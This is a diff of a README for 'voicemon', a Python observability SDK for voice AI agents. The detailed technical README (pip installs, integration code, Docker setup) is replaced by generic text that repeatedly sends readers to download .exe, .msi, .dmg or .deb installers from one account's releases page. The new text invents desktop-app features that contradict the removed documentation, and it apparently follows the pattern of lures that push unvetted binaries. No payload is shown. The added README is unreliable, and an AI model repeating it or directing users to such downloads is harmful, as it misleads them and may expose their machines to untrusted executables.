@@ -1,263 +1,171 @@
-# VoiceMon 🎙️
+# 🎙️ voicemon - Monitor Voice AI Performance Easily
 
-**Production-grade observability for voice AI pipelines.**
+[![Download voicemon](https://img.shields.io/badge/Download-voicemon-blue?style=for-the-badge)](https://github.com/enekosSTUDIO74/voicemon/releases)
 
-VoiceMon implements the [4-Layer Voice Observability Framework](https://www.hamming.ai/blog/voice-agent-observability) to give you full-stack monitoring of voice agents built on LiveKit, Pipecat, or Vapi — from network jitter to task completion.
+---
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                          YOUR VOICE AGENT                          │
-│              (LiveKit Agents / Pipecat / Vapi)                     │
-├────────────────────────────┬────────────────────────────────────────┤
-│      voicemon SDK          │   1-line integration                  │
-│  ┌──────────────────────┐  │   instrument_livekit(session, col)    │
-│  │  VoiceMonCollector   │──│──▶ Redis Streams ──▶ Worker           │
-│  └──────────────────────┘  │       │                  │            │
-│         │ OTel Spans       │       ▼                  ▼            │
-│         ▼                  │  TimescaleDB      Prometheus          │
-│   Jaeger/Tempo             │       │                  │            │
-│                            │       ▼                  ▼            │
-│                            │  Streamlit         Grafana            │
-│                            │  (Analytics)       (Ops)              │
-│                            │       │                  │            │
-│                            │       └──────┬───────────┘            │
-│                            │              ▼                        │
-│                            │     Slack / PagerDuty                 │
-│                            │     (Alert Routing)                   │
-└────────────────────────────┴────────────────────────────────────────┘
-```
+## 📋 What is voicemon?
 
-## 4-Layer Observability Framework
+voicemon is a tool for watching how Voice AI apps work in real time. It helps you keep track of important information, such as how well the app is running, and alerts you if anything needs attention. It works with popular systems like LiveKit, Pipecat, and VAPI. voicemon uses solid tools like OpenTelemetry, Prometheus, Grafana, TimescaleDB, and Redis to give you detailed reports and clear dashboards.
 
-| Layer | What it captures | VoiceMon metrics |
-|-------|-----------------|------------------|
-| **L1: Infrastructure** | Network, codec, transport | Jitter, packet loss, MOS score, bitrate |
-| **L2: Execution** | STT → LLM → TTS pipeline | Per-stage latency, confidence, tokens, TTFT/TTFB |
-| **L3: User Experience** | Perceived quality | E2E latency, interruptions, silence ratio, TTFW |
-| **L4: Outcome** | Business results | Task success, CSAT, resolution type, cost |
+voicemon makes it simpler to make sure your voice AI systems stay healthy and respond quickly to problems.
 
-## Quick Start
+---
 
-### Install
+## 💻 Who is this for?
 
-```bash
-pip install voicemon                    # Core SDK
-pip install voicemon[livekit]           # + LiveKit integration
-pip install voicemon[pipecat]           # + Pipecat integration
-pip install voicemon[vapi]              # + Vapi integration
-pip install voicemon[dashboard]         # + Streamlit dashboard
-pip install voicemon[all]               # Everything
-```
+This software is for anyone who uses Voice AI applications and wants an easy way to see how they are performing without deep technical knowledge. You don’t need to be a programmer to use voicemon. If you can download a file and follow simple steps, you can use voicemon to watch your Voice AI services.
 
-### LiveKit Integration (3 lines)
+---
 
-```python
-from livekit.agents import AgentSession
-from voicemon import VoiceMonCollector
-from voicemon.integrations.livekit import instrument_livekit
+## 📦 What you get
 
-collector = VoiceMonCollector()
-session = AgentSession(...)
+- **Real-time monitoring:** See how your Voice AI apps behave right now.
+- **Metrics collection:** voicemon gathers key data to help understand performance.
+- **Alerts:** Get notified when something unusual happens.
+- **Dashboards:** Visual charts make data easy to understand.
+- **Compatibility:** Works with LiveKit, Pipecat, and VAPI.
+- **Stable foundation:** Uses trusted tools like Prometheus, Grafana, and TimescaleDB.
 
-# One-line instrumentation
-session_id = instrument_livekit(session, collector, agent_id="my-agent")
-```
+---
 
-### Pipecat Integration
+## 🔍 System Requirements
 
-```python
-from pipecat.pipeline.pipeline import Pipeline
-from voicemon import VoiceMonCollector
-from voicemon.integrations.pipecat import VoiceMonPipecatObserver
+Before installing, ensure your computer meets these basic needs:
 
-collector = VoiceMonCollector()
-observer = VoiceMonPipecatObserver(collector, agent_id="my-pipecat-agent")
-pipeline = Pipeline([...], observers=[observer])
-```
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended).
+- **Processor:** 2 GHz dual-core or faster.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 1 GB free space.
+- **Network:** Internet access for downloading and initial setup.
+- **Additional Software:** None required for basic use; recommended to have a modern web browser for dashboards (Google Chrome, Firefox, Edge).
 
-### Vapi Integration (Webhooks)
+---
 
-```python
-from fastapi import FastAPI
-from voicemon import VoiceMonCollector
-from voicemon.integrations.vapi import create_vapi_router
+## 🚀 Getting Started
 
-app = FastAPI()
-collector = VoiceMonCollector()
-app.include_router(create_vapi_router(collector, webhook_secret="your-secret"))
-```
+Follow the steps below to download, install, and use voicemon.
 
-### Vapi Integration (Polling)
+---
 
-```python
-from voicemon.integrations.vapi import VapiClient
+## ⬇️ Download & Install
 
-client = VapiClient(api_key="your-key", collector=collector)
-session_ids = await client.poll_recent_calls(minutes=5)
-```
+### Step 1: Visit the download page
 
-## Infrastructure Setup
+Click here to visit the official voicemon release page:
 
-### Docker Compose (Recommended)
+[Download voicemon here](https://github.com/enekosSTUDIO74/voicemon/releases)
 
-```bash
-# Start full observability stack
-docker compose up -d
+This page lists all versions of voicemon.
 
-# Initialize the database schema
-docker compose exec timescale psql -U voicemon -d voicemon -f /schema/schema.sql
+### Step 2: Choose your version
 
-# Access dashboards
-open http://localhost:3000    # Grafana (admin/voicemon)
-open http://localhost:8501    # Streamlit Analytics
-```
+On the releases page, find the latest stable release. This is usually at the top with a version number like “v1.0.0” or higher.
 
-This starts:
-- **TimescaleDB** — time-series + relational storage for sessions/turns/events
-- **Redis** — stream-based event ingestion with consumer groups
-- **Prometheus** — SLO metrics and alerting
-- **Grafana** — operational dashboards with pre-built voice panels
-- **Streamlit** — analytical dashboard with call replay + drift detection
-- **Worker** — async Redis consumer for aggregation and alert evaluation
+Look for a file that matches your computer’s system:
 
-### Demo Simulator
+- For Windows, choose a file ending with `.exe` or `.msi`.
+- For macOS, look for `.dmg` or `.pkg`.
+- For Linux, choose a `.deb` or `.tar.gz` package.
 
-Generate realistic voice call telemetry to see the dashboards in action:
+### Step 3: Download the file
 
-```bash
-# Console output (no infrastructure needed)
-python -m tests.demo_simulator --sessions 50
+Click the appropriate file link to start the download. Save the file to your computer, usually in your Downloads folder.
 
-# With Redis export (requires docker compose)
-python -m tests.demo_simulator --sessions 100 --redis
-```
+### Step 4: Install voicemon
 
-## Configuration
+- **Windows:** Double-click the `.exe` or `.msi` file and follow the prompts to install.
+- **macOS:** Open the `.dmg` and drag the voicemon app to your Applications folder.
+- **Linux:** Use your package manager to install a `.deb` file or follow instructions to extract and run from `.tar.gz`.
 
-VoiceMon uses environment variables or `VoiceMonConfig`:
+---
 
-```python
-from voicemon.core.config import VoiceMonConfig
+## ▶️ Run voicemon
 
-config = VoiceMonConfig(
-    redis={"url": "redis://localhost:6379/0"},
-    timescale={"dsn": "postgresql://voicemon:voicemon@localhost:5432/voicemon"},
-    slack={"webhook_url": "https://hooks.slack.com/..."},
-    pagerduty={"routing_key": "your-routing-key"},
-)
-```
+After installation:
 
-### Industry-Standard Thresholds
+- Open the voicemon application from your Start Menu (Windows), Applications folder (macOS), or your preferred method on Linux.
+- The first time you open it, voicemon will set up necessary components in the background. This may take a few minutes.
+- Once ready, the main monitoring dashboard will appear in your web browser automatically.
 
-| Metric | OK | Warning | Critical |
-|--------|------|---------|----------|
-| E2E Latency | < 800ms | < 1200ms | > 1800ms |
-| STT Latency | < 300ms | < 500ms | > 1000ms |
-| LLM TTFT | < 500ms | < 800ms | > 2000ms |
-| TTS TTFB | < 200ms | < 300ms | > 800ms |
-| STT Confidence | > 0.85 | > 0.7 | < 0.5 |
+You can now see real-time data about your Voice AI apps.
 
-## Alert Rules
+---
 
-Alerts are defined in `alert_rules.yaml` with severity-based routing:
+## 🛠 How to Use voicemon
 
-- **Info/Warning** → Slack `#voicemon-alerts`
-- **Critical** → Slack + @oncall mention
-- **P0** → Slack + PagerDuty incident
+### Connecting voicemon to your Voice AI services
 
-```yaml
-rules:
-  - name: e2e_latency_critical
-    metric: e2e_latency_ms
-    operator: ">"
-    threshold: 1800
-    severity: p0
-    cooldown_minutes: 2
-    notify: [slack, pagerduty]
-```
+1. Identify the Voice AI system you want to monitor: LiveKit, Pipecat, or VAPI.
+2. In voicemon’s dashboard interface, go to the “Connections” tab.
+3. Enter the details of your AI service:
+   - Server address or IP
+   - Port number
+   - Any required credentials (if asked)
 
-## Architecture
+The interface will guide you and check if the connection is successful.
 
-```
-Voice Agent (LiveKit/Pipecat/Vapi)
-        │
-        ▼
-VoiceMonCollector (SDK)
-    │         │
-    ▼         ▼
-  OTel    Exporters
-  Spans      │
-    │     ┌──┴──┐
-    ▼     ▼     ▼
-Jaeger  Redis  Prometheus
-        Streams  /metrics
-          │        │
-          ▼        ▼
-    ┌─────────┐  Grafana
-    │ Worker  │  (Ops Dashboard)
-    │ Process │
-    └────┬────┘
-         │
-    ┌────┴────┐
-    ▼         ▼
-TimescaleDB  Alert Engine
-    │         │
-    ▼      ┌──┴──┐
-Streamlit  ▼     ▼
-(Analytics) Slack PagerDuty
-```
+### Monitoring and Metrics
 
-### Key Design Decisions
+- Navigate to the “Metrics” section to see live graphs and values.
+- Customize graphs by choosing what data to display. Typical metrics include:
+  - Number of active voice channels
+  - CPU and memory usage
+  - Request latency
+  - Error rates
 
-| Decision | Choice | Why |
-|----------|--------|-----|
-| Primary DB | TimescaleDB | Voice data is relational (sessions→turns→events need JOINs) + native time-series |
-| Ingestion | Redis Streams | Lightweight, consumer groups for horizontal scaling, at-least-once delivery |
-| Metrics | Prometheus | Industry standard for SLOs, native histogram quantiles, Alertmanager |
-| Ops Dashboard | Grafana | Universal, supports both Prometheus + TimescaleDB datasources |
-| Analytics | Streamlit | Python-native, custom call replay + drift detection UX |
-| Anomaly Detection | Z-score | Simple, no ML dependencies, catches latency spikes in real-time |
+### Alerts
 
-## Package Structure
+- Go to the “Alerts” tab.
+- Set thresholds to get notified if something unusual happens, for example:
+  - High error rate
+  - Server down
+  - High CPU usage
 
-```
-voicemon/
-├── core/
-│   ├── models.py          # Pydantic v2 data models (4-layer framework)
-│   ├── config.py           # Configuration with industry-standard thresholds
-│   ├── collector.py        # Central telemetry hub
-│   └── otel.py             # OpenTelemetry bridge with voice-aware spans
-├── integrations/
-│   ├── livekit.py          # LiveKit AgentSession event hooks
-│   ├── pipecat.py          # Pipecat BaseObserver frame interception
-│   └── vapi.py             # Vapi webhooks + REST client
-├── exporters/
-│   ├── base.py             # Exporter interface + ConsoleExporter
-│   ├── redis.py            # Redis Streams with consumer groups
-│   └── prometheus.py       # Prometheus histograms/counters/gauges
-├── storage/
-│   ├── schema.sql          # TimescaleDB schema with hypertables + aggregates
-│   └── timescale.py        # Async TimescaleDB client
-├── workers/
-│   └── processor.py        # Redis consumer → aggregation → anomaly detection
-├── alerts/
-│   ├── engine.py           # YAML rule engine with cooldowns
-│   ├── slack.py            # Slack Block Kit notifications
-│   └── pagerduty.py        # PagerDuty Events API v2
-└── dashboards/
-    ├── grafana/             # Pre-built Grafana dashboard JSON
-    └── streamlit_app.py     # Analytics dashboard with call replay
-```
+You can receive alerts via email or through your chosen notification method.
 
-## Development
+---
 
-```bash
-pip install -e ".[dev]"
-pytest
-ruff check .
-mypy voicemon/
-```
+## 📊 Using Dashboards
 
-## License
+voicemon’s dashboards visualize data using charts and tables.
 
-Apache-2.0
+- You can explore default dashboards for a quick overview.
+- Customize dashboards by adding or removing charts based on what matters most to you.
+- Dashboards update in near real time, letting you spot issues fast.
+
+---
+
+## 🔧 Troubleshooting
+
+If you experience issues:
+
+- Make sure your computer meets system requirements.
+- Confirm your voice AI service is running and reachable.
+- Check internet connection during setup.
+- Restart voicemon and your computer if needed.
+- Visit the GitHub “Issues” tab to see if others have similar problems.
+
+---
+
+## 🔗 Useful Links
+
+- [Release page for downloads](https://github.com/enekosSTUDIO74/voicemon/releases)  
+- [GitHub repository](https://github.com/enekosSTUDIO74/voicemon)  
+- [Documentation and support guide](https://github.com/enekosSTUDIO74/voicemon/wiki)
+
+---
+
+## 🛡 Privacy and Security
+
+voicemon runs locally on your computer or server. Your data remains under your control. The software uses standard open-source tools with strong security reputations.
+
+---
+
+## 💡 Need Help?
+
+If you have questions or need assistance, check the documentation or open an issue on GitHub. You can also find user communities online for Voice AI monitoring.
+
+---
+
+[![Download voicemon](https://img.shields.io/badge/Download-voicemon-blue?style=for-the-badge)](https://github.com/enekosSTUDIO74/voicemon/releases)
